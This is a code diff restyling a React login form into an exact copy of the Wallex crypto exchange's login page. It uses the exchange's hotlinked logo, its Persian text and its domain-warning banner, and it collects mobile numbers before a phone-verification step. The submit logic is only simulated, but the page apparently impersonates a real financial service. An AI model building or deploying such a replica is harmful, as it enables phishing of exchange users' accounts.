@@ -18,7 +18,6 @@ export const LoginForm = () => {
   }>({});
 
   const validateMobileNumber = (number: string): boolean => {
-    // Persian mobile number validation (should start with 09 and be 11 digits)
     const mobileRegex = /^09\d{9}$/;
     return mobileRegex.test(number);
   };
@@ -27,7 +26,6 @@ export const LoginForm = () => {
     e.preventDefault();
     setErrors({});
 
-    // Validation
     const newErrors: { mobileNumber?: string; inviteCode?: string } = {};
 
     if (!mobileNumber) {
@@ -44,13 +42,8 @@ export const LoginForm = () => {
     setIsSubmitting(true);
 
     try {
-      // In a real app, this would send SMS verification code
       console.log("Sending SMS to:", { mobileNumber, inviteCode });
-
-      // Simulate API call to send SMS
       await new Promise((resolve) => setTimeout(resolve, 1000));
-
-      // Navigate to verification page
       navigate("/verify-phone", {
         state: { phoneNumber: mobileNumber },
       });
@@ -65,19 +58,51 @@ export const LoginForm = () => {
   };
 
   return (
-    <div className="bg-white rounded-2xl w-full max-w-md lg:max-w-[480px] mx-auto">
-      <div className="flex flex-col gap-2 p-4 sm:p-5 lg:p-5">
-        {/* Header */}
+    <div
+      className="w-full max-w-md lg:max-w-[480px] mx-auto"
+      style={{
+        backgroundColor: "rgb(255, 255, 255)",
+        borderRadius: "16px",
+      }}
+    >
+      <div
+        className="flex flex-col gap-2"
+        style={{
+          padding: "20px",
+          width: "100%",
+        }}
+      >
+        {/* Header - Exact Wallex Style */}
         <div className="flex justify-between items-center w-full">
           <div className="flex items-center gap-2">
             <Button
               variant="ghost"
               size="icon"
-              className="rounded-full border-0 text-gray-600 hover:bg-gray-100 flex-shrink-0"
+              className="flex-shrink-0 p-0 bg-transparent hover:bg-gray-100"
+              style={{
+                borderRadius: "50%",
+                width: "auto",
+                height: "auto",
+                padding: "0",
+                backgroundColor: "rgba(0, 0, 0, 0)",
+              }}
             >
-              <ChevronLeft className="h-5 w-5 sm:h-6 sm:w-6" />
+              <ChevronLeft
+                style={{
+                  width: "24px",
+                  height: "24px",
+                  color: "rgba(0, 0, 0, 0.6)",
+                  cursor: "pointer",
+                }}
+              />
             </Button>
-            <span className="font-bold text-sm sm:text-base">
+            <span
+              style={{
+                fontWeight: "700",
+                fontSize: "16px",
+                color: "rgb(0, 0, 0)",
+              }}
+            >
               ورود یا ثبت‌نام
             </span>
           </div>
@@ -85,19 +110,30 @@ export const LoginForm = () => {
             <img
               src="https://wallex.ir/_next/image?url=%2Fimages%2Fwallex-logo-v-light.svg&w=256&q=75"
               alt="صرافی خرید فروش ارزهای دیجیتال"
-              width={128}
-              height={24}
-              className="h-5 w-24 sm:h-6 sm:w-32 object-contain"
+              style={{
+                width: "128px",
+                height: "24px",
+                objectFit: "contain",
+              }}
             />
           </a>
         </div>
 
-        {/* Separator */}
-        <hr className="border-gray-200 -mx-4 sm:-mx-5 my-2" />
+        {/* Separator - Exact Wallex Style */}
+        <hr
+          style={{
+            borderColor: "rgba(0, 0, 0, 0.2)",
+            borderBottom: "1px solid rgba(0, 0, 0, 0.2)",
+            marginLeft: "-20px",
+            marginRight: "-20px",
+            marginTop: "8px",
+            marginBottom: "8px",
+          }}
+        />
 
         {/* Content */}
-        <div className="flex flex-col gap-2 mt-4">
-          {/* Alert Messages */}
+        <div className="flex flex-col gap-2" style={{ marginTop: "16px" }}>
+          {/* Alert Messages - Exact Wallex Style */}
           <div className="space-y-2">
             <AlertMessage>مطمئن شوید که در دامنه wallex.ir هستید.</AlertMessage>
 
@@ -109,15 +145,32 @@ export const LoginForm = () => {
 
           {/* Form */}
           <form onSubmit={handleSubmit}>
-            {/* Mobile Number Input */}
-            <div className="my-4">
+            {/* Mobile Number Input - Exact Wallex Style */}
+            <div
+              style={{
+                display: "inline-flex",
+                flexDirection: "column",
+                position: "relative",
+                verticalAlign: "top",
+                width: "100%",
+                marginBottom: "16px",
+                marginTop: "16px",
+              }}
+            >
               <label
                 htmlFor="mobile-input"
-                className="block text-sm font-medium mb-2 text-right"
+                style={{
+                  fontSize: "14px",
+                  fontWeight: "500",
+                  lineHeight: "24.01px",
+                  marginBottom: "8px",
+                  textAlign: "right",
+                  color: "rgb(0, 0, 0)",
+                }}
               >
                 شماره همراه را وارد کنید.
               </label>
-              <div className="relative">
+              <div style={{ position: "relative" }}>
                 <Input
                   id="mobile-input"
                   name="mobile_number"
@@ -126,10 +179,8 @@ export const LoginForm = () => {
                   maxLength={11}
                   value={mobileNumber}
                   onChange={(e) => {
-                    // Only allow numbers and format for Persian mobile numbers
                     const value = e.target.value.replace(/[^0-9]/g, "");
                     setMobileNumber(value);
-                    // Clear errors when user starts typing
                     if (errors.mobileNumber) {
                       setErrors((prev) => ({
                         ...prev,
@@ -137,41 +188,66 @@ export const LoginForm = () => {
                       }));
                     }
                   }}
-                  className={cn(
-                    "w-full rounded-lg border px-3 py-2 text-right focus:border-blue-500 focus:ring-1 focus:ring-blue-500",
-                    errors.mobileNumber ? "border-red-500" : "border-gray-300",
-                  )}
+                  className="w-full text-right"
+                  style={{
+                    borderRadius: "8px",
+                    border: errors.mobileNumber
+                      ? "1px solid rgb(220, 38, 38)"
+                      : "1px solid rgba(0, 0, 0, 0.2)",
+                    padding: "10px 12px",
+                    fontSize: "14px",
+                    textAlign: "right",
+                    backgroundColor: "rgb(255, 255, 255)",
+                  }}
                   placeholder="09123456789"
                   autoFocus
                   disabled={isSubmitting}
                 />
                 {errors.mobileNumber && (
-                  <p className="text-red-500 text-xs mt-1 text-right">
+                  <p
+                    className="text-right mt-1"
+                    style={{
+                      color: "rgb(220, 38, 38)",
+                      fontSize: "12px",
+                    }}
+                  >
                     {errors.mobileNumber}
                   </p>
                 )}
               </div>
             </div>
 
-            {/* Invite Code Toggle Button */}
+            {/* Invite Code Toggle Button - Exact Wallex Style */}
             <Button
               type="button"
-              variant="ghost"
               onClick={() => setShowInviteCode(!showInviteCode)}
-              className="text-blue-500 border-0 text-sm font-medium p-1 mb-1 justify-start hover:bg-transparent"
+              className="justify-start p-1 mb-1 hover:bg-transparent"
+              style={{
+                backgroundColor: "rgba(0, 0, 0, 0)",
+                border: "none",
+                color: "rgb(0, 122, 255)",
+                fontSize: "14px",
+                fontWeight: "500",
+                textTransform: "uppercase",
+                padding: "4px",
+                marginBottom: "4px",
+              }}
             >
               <ChevronDown
                 className={cn(
-                  "h-6 w-6 mr-1 transition-transform duration-200",
+                  "mr-1 transition-transform duration-200",
                   showInviteCode ? "rotate-180" : "",
                 )}
+                style={{
+                  width: "24px",
+                  height: "24px",
+                  marginLeft: "4px",
+                }}
               />
-              <span className="text-sm font-medium uppercase">
-                کد دعوت دارید؟
-              </span>
+              <span>کد دعوت دارید؟</span>
             </Button>
 
-            {/* Invite Code Section (Collapsible) */}
+            {/* Invite Code Section */}
             <div
               className={cn(
                 "overflow-hidden transition-all duration-300",
@@ -179,43 +255,76 @@ export const LoginForm = () => {
               )}
             >
               {showInviteCode && (
-                <div className="flex w-full">
-                  <div className="w-full">
-                    <div className="w-full">
-                      <Input
-                        name="invite_code"
-                        type="text"
-                        placeholder="کد معرف (اختیاری)"
-                        value={inviteCode}
-                        onChange={(e) => setInviteCode(e.target.value)}
-                        className="w-full rounded-lg border border-gray-300 px-3 py-2 text-right focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
-                      />
-                      <p className="text-gray-600 text-xs mt-2 text-right flex items-center">
-                        <Info className="h-4 w-4 mr-2 text-gray-600" />
-                        <span>
-                          کد دعوت صرفا در زمان ثبت‌نام قابل استفاده است.
-                        </span>
-                      </p>
-                    </div>
-                  </div>
+                <div className="w-full">
+                  <Input
+                    name="invite_code"
+                    type="text"
+                    placeholder="کد معرف (اختیاری)"
+                    value={inviteCode}
+                    onChange={(e) => setInviteCode(e.target.value)}
+                    className="w-full text-right"
+                    style={{
+                      borderRadius: "8px",
+                      border: "1px solid rgba(0, 0, 0, 0.2)",
+                      padding: "10px 12px",
+                      fontSize: "14px",
+                      textAlign: "right",
+                      backgroundColor: "rgb(255, 255, 255)",
+                    }}
+                  />
+                  <p
+                    className="text-right mt-2 flex items-center"
+                    style={{
+                      color: "rgba(0, 0, 0, 0.6)",
+                      fontSize: "12px",
+                      lineHeight: "20.004px",
+                    }}
+                  >
+                    <Info
+                      className="mr-2"
+                      style={{ width: "24px", height: "24px" }}
+                    />
+                    <span>کد دعوت صرفا در زمان ثبت‌نام قابل استفاده است.</span>
+                  </p>
                 </div>
               )}
             </div>
 
-            {/* Submit Section */}
-            <div className="mt-4">
-              <hr className="border-gray-200 -mx-4 sm:-mx-5 mb-4" />
+            {/* Submit Section - Exact Wallex Style */}
+            <div style={{ marginTop: "16px" }}>
+              <hr
+                style={{
+                  borderColor: "rgba(0, 0, 0, 0.2)",
+                  borderBottom: "1px solid rgba(0, 0, 0, 0.2)",
+                  marginLeft: "-20px",
+                  marginRight: "-20px",
+                  marginBottom: "16px",
+                }}
+              />
               <Button
                 type="submit"
                 disabled={isSubmitting}
-                className="w-full bg-gray-800 hover:bg-gray-900 text-white rounded-lg py-2.5 sm:py-2 px-4 font-medium text-xs sm:text-sm uppercase disabled:opacity-50 disabled:cursor-not-allowed"
+                className="w-full"
+                style={{
+                  backgroundColor: "rgb(23, 29, 38)",
+                  color: "rgb(255, 255, 255)",
+                  borderRadius: "8px",
+                  padding: "10px 16px",
+                  fontSize: "14px",
+                  fontWeight: "500",
+                  textTransform: "uppercase",
+                  border: "none",
+                  cursor: isSubmitting ? "not-allowed" : "pointer",
+                  opacity: isSubmitting ? "0.5" : "1",
+                }}
               >
                 {isSubmitting ? (
                   <div className="flex items-center justify-center">
-                    <Loader2 className="h-3 w-3 sm:h-4 sm:w-4 animate-spin mr-2" />
-                    <span className="text-xs sm:text-sm">
-                      در حال ارسال کد...
-                    </span>
+                    <Loader2
+                      className="animate-spin mr-2"
+                      style={{ width: "16px", height: "16px" }}
+                    />
+                    <span>در حال ارسال کد...</span>
                   </div>
                 ) : (
                   "ثبت و ادامه"
